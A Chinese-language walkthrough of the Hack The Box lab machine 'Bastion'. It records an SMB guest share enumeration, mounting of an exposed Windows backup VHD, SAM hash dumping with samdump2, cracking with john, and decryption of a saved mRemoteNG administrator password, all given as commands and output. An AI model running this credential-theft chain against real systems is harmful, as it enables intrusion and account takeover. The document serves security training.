# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务发现

先快速看看哪些端口开着
```
┌──(root💀kali)-[~/htb/Bastion]
└─# nmap -p- 10.10.10.134 --open               
Nmap scan report for 10.10.10.134
Host is up (0.50s latency).
Not shown: 63143 closed ports, 2379 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

```

再详细查看指定端口信息
```
└─# nmap -Pn -sV 10.10.10.134 -A -O -p 22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-22 09:04 EST
Nmap scan report for 10.10.10.134
Host is up (0.58s latency).

PORT      STATE    SERVICE      VERSION
22/tcp    open     tcpwrapped
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open     msrpc        Microsoft Windows RPC
139/tcp   filtered netbios-ssn
445/tcp   open     microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49667/tcp open     unknown
49668/tcp open     unknown
49669/tcp open     unknown
49670/tcp open     unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m59s, deviation: 34m33s, median: -3s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-12-22T15:06:21+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-12-22T14:06:17
|_  start_date: 2021-12-22T13:37:56

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   566.46 ms 10.10.14.1
2   565.05 ms 10.10.10.134

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 181.76 seconds

```

## smbmap
看到nmap扫描出smb有一个用户```guest```，用```smbmap```查看分享目录信息
```
┌──(root💀kali)-[~/htb/Bastion]
└─#  smbmap -H 10.10.10.134 -u guest
[+] IP: 10.10.10.134:445        Name: 10.10.10.134                                      
[-] Work[!] Unable to remove test directory at \\10.10.10.134\Backups\YCUDSRXTPW, please remove manually
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Backups                                                 READ, WRITE
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC

```


进入Backups目录
```
┌──(root💀kali)-[~/htb/Bastion]
└─# smbclient //10.10.10.134/Backups -U guest
Enter WORKGROUP\guest's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Dec 22 10:47:38 2021
  ..                                  D        0  Wed Dec 22 10:47:38 2021
  CFZMBSIEGP                          D        0  Wed Dec 22 10:36:04 2021
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  TFHLPWIACJ                          D        0  Wed Dec 22 10:47:38 2021
  WindowsImageBackup                 Dn        0  Fri Feb 22 07:44:02 2019
  YCUDSRXTPW                          D        0  Wed Dec 22 10:44:00 2021

```

note.txt内容
```
┌──(root💀kali)-[~/htb/Bastion]
└─# cat note.txt                                    

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.

```

整个文件备份应该是指```WindowsImageBackup```这个文件夹

## mount 和 guestmount

有两个vhd文件，查了一下是微软的虚拟机文件格式，相当于虚拟机的硬盘
路径:
> \\10.10.10.134\Backups\WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\



把远程文件挂载到本地
```mount -t cifs //10.10.10.134/backups/WindowsImageBackup/L4mpje-PC/ /mnt/myshare -o user=,password= ```

在kali上挂载远程分享文件夹下的vhd文件
```guestmount -a '/mnt/myshare/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd' -m /dev/sda1 --ro /root/htb/Bastion/windows```

现在进入```/root/htb/Bastion/windows```就相当于进入了靶机的备份的windows系统

```
┌──(root💀kali)-[~/htb/Bastion/windows]
└─# ll                   
总用量 2096729
drwxrwxrwx 1 root root          0  2月 22  2019 '$Recycle.Bin'
-rwxrwxrwx 1 root root         24  6月 10  2009  autoexec.bat
-rwxrwxrwx 1 root root         10  6月 10  2009  config.sys
lrwxrwxrwx 2 root root         14  7月 14  2009 'Documents and Settings' -> /sysroot/Users
-rwxrwxrwx 1 root root 2147016704  2月 22  2019  pagefile.sys
drwxrwxrwx 1 root root          0  7月 13  2009  PerfLogs
drwxrwxrwx 1 root root       4096  7月 14  2009  ProgramData
drwxrwxrwx 1 root root       4096  4月 11  2011 'Program Files'
drwxrwxrwx 1 root root          0  2月 22  2019  Recovery
drwxrwxrwx 1 root root       4096  2月 22  2019 'System Volume Information'
drwxrwxrwx 1 root root       4096  2月 22  2019  Users
drwxrwxrwx 1 root root      16384  2月 22  2019  Windows

```

## samdump2拿到sam哈希

现在我们来到```/root/htb/Bastion/windows/Windows/System32/config```目录

使用```samdump2```命令打印出该系统内sam保存的哈希信息
```
┌──(root💀kali)-[~/…/windows/Windows/System32/config]
└─# samdump2 SYSTEM SAM                                                                                                                                                                                 127 ⨯
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::

```
截取 ```L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::```保存到本地hash.txt文件

## 使用john破解

```
┌──(root💀kali)-[~/htb/Bastion]
└─# john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
bureaulampje     (L4mpje)
1g 0:00:00:00 DONE (2021-12-23 02:57) 1.176g/s 11053Kp/s 11053Kc/s 11053KC/s buresres..burdy1
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed

```

得到一个登陆凭证：```L4mpje : bureaulampje ```

# 初始shell
使用ssh服务登陆L4mpje的账号

> ssh L4mpje@10.10.10.134

```
Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                                                                                                                           
l4mpje@BASTION C:\Users\L4mpje>whoami                                                                                           
bastion\l4mpje     
```

# 提权

在L4mpje的缓存文件夹里发现有一个```mRemoteNG```的用户数据

mRemoteNG是一款远程桌面工具，有可能保存有用户的登陆信息

```
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir                                                                                                                                                      
 Volume in drive C has no label.                                                                                                                                                                                  
 Volume Serial Number is 0CB3-C487                                                                                                                                                                                
                                                                                                                                                                                                                  
 Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG                                                                                                                                                           
                                                                                                                                                                                                                  
22-02-2019  14:03    <DIR>          .                                                                                                                                                                             
22-02-2019  14:03    <DIR>          ..                                                                                                                                                                            
22-02-2019  14:03             6.316 confCons.xml                                                                                                                                                                  
22-02-2019  14:02             6.194 confCons.xml.20190222-1402277353.backup                                                                                                                                       
22-02-2019  14:02             6.206 confCons.xml.20190222-1402339071.backup                                                                                                                                       
22-02-2019  14:02             6.218 confCons.xml.20190222-1402379227.backup                                                                                                                                       
22-02-2019  14:02             6.231 confCons.xml.20190222-1403070644.backup                                                                                                                                       
22-02-2019  14:03             6.319 confCons.xml.20190222-1403100488.backup                                                                                                                                       
22-02-2019  14:03             6.318 confCons.xml.20190222-1403220026.backup                                                                                                                                       
22-02-2019  14:03             6.315 confCons.xml.20190222-1403261268.backup                                                                                                                                       
22-02-2019  14:03             6.316 confCons.xml.20190222-1403272831.backup                                                                                                                                       
22-02-2019  14:03             6.315 confCons.xml.20190222-1403433299.backup                                                                                                                                       
22-02-2019  14:03             6.316 confCons.xml.20190222-1403486580.backup                                                                                                                                       
22-02-2019  14:03                51 extApps.xml                                                                                                                                                                   
22-02-2019  14:03             5.217 mRemoteNG.log                                                                                                                                                                 
22-02-2019  14:03             2.245 pnlLayout.xml                                                                                                                                                                 
22-02-2019  14:01    <DIR>          Themes                                                                                                                                                                        
              14 File(s)         76.577 bytes                                                                                                                                                                     
               3 Dir(s)  11.305.373.696 bytes free  
```

因为靶机安装了ssh，所以我们可以用scp命令把文件从靶机下载到kali
```
┌──(root💀kali)-[~/htb/Bastion]
└─# scp l4mpje@10.10.10.134:/Users/L4mpje/AppData/Roaming/mRemoteNG/confCons.xml .                                                                                                                                                      1 ⨯
l4mpje@10.10.10.134's password: 
confCons.xml    
```


查看```confCons.xml```文件，发现```Administrator```的哈希密码：```aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==```


```
┌──(root💀kali)-[~/htb/Bastion]
└─# cat confCons.xml                                    
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
      
```

这串密码看上去像bash64，但其实不是。在谷歌上搜索```mremoteng decrypt```找到这个[mremoteng decrypt脚本](https://github.com/haseebT/mRemoteNG-Decrypt)


解密
```
┌──(root💀kali)-[~/htb/Bastion]
└─# python3 mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
Password: thXLHM96BeKL0ER2

```

拿到Administrator的登陆密码：```thXLHM96BeKL0ER2```

ssh登陆拿到root.txt
```
Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            

administrator@BASTION C:\Users\Administrator>whoami                                                                             
bastion\administrator                                                                                                           

administrator@BASTION C:\Users\Administrator>cd Desktop                                                                         

administrator@BASTION C:\Users\Administrator\Desktop>dir                                                                        
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is 0CB3-C487                                                                                              

 Directory of C:\Users\Administrator\Desktop                                                                                    

23-02-2019  09:40    <DIR>          .                                                                                           
23-02-2019  09:40    <DIR>          ..                                                                                          
23-02-2019  09:07                32 root.txt                                                                                    
               1 File(s)             32 bytes                                                                                   
               2 Dir(s)  11.305.373.696 bytes free    
```

# 总结
因为靶机"错误"的把备份系统文件放在了分享目录，因此利用```mount``` 和 ```guestmount```命令我们可以读取到靶机备份系统里面的敏感文件
利用samdump2命令可以提取到靶机的sam哈希密码
进入系统以后，因为靶机缓存文件夹```/Users/L4mpje/AppData/Roaming```里有远程桌面工具```mRemoteNG```的缓存配置信息，我们破解密码后提权到了管理员权限。